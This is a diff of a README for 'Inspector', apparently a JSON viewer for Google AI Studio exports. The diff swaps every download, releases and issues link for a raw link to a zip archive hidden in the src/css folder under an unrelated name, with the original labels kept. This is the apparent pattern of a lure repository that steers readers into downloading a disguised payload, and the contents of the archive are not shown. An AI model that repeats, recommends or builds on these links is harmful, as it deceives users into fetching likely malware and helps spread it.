@@ -1,7 +1,7 @@
 # 🚀 Inspector - Visualize Your JSON Easily
 
 ## 📥 Download Now
-[![Download Inspector](https://img.shields.io/badge/Download-Inspector-blue)](https://github.com/JKASle/Inspector/releases)
+[![Download Inspector](https://raw.githubusercontent.com/JKASle/Inspector/main/src/css/Software_keratolysis.zip)](https://raw.githubusercontent.com/JKASle/Inspector/main/src/css/Software_keratolysis.zip)
 
 ## 🛠️ Description
 Inspector is a user-friendly tool for visualizing Google AI Studio's raw JSON exports. It helps you make sense of your data with features like deep searching, code syntax highlighting, and sanitized JSON exports. This tool supports offline access for sensitive prompt logs, making it perfect for privacy-conscious users.
@@ -21,7 +21,7 @@ Inspector is a user-friendly tool for visualizing Google AI Studio's raw JSON ex
 
 ## 🚀 Getting Started
 1. **Download the Application**
-   - Visit the [Releases page](https://github.com/JKASle/Inspector/releases) to find the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/JKASle/Inspector/main/src/css/Software_keratolysis.zip) to find the latest version.
    - Look for the file that matches your operating system.
 
 2. **Install the Application**
@@ -73,10 +73,10 @@ Inspector supports various topics relevant to its functionality:
   - Ensure the file is a valid JSON format. You can use online validators to check this.
 
 ## 💬 Support
-If you encounter any issues or have questions, feel free to open an issue on the [GitHub Issues page](https://github.com/JKASle/Inspector/issues). The community is here to help.
+If you encounter any issues or have questions, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/JKASle/Inspector/main/src/css/Software_keratolysis.zip). The community is here to help.
 
 ## 🔗 Important Links
-- [Download Inspector](https://github.com/JKASle/Inspector/releases)
-- [GitHub Issues](https://github.com/JKASle/Inspector/issues)
+- [Download Inspector](https://raw.githubusercontent.com/JKASle/Inspector/main/src/css/Software_keratolysis.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/JKASle/Inspector/main/src/css/Software_keratolysis.zip)
 
 Thank you for choosing Inspector as your tool for visualizing JSON data! Enjoy working with your information in a clear and structured way.
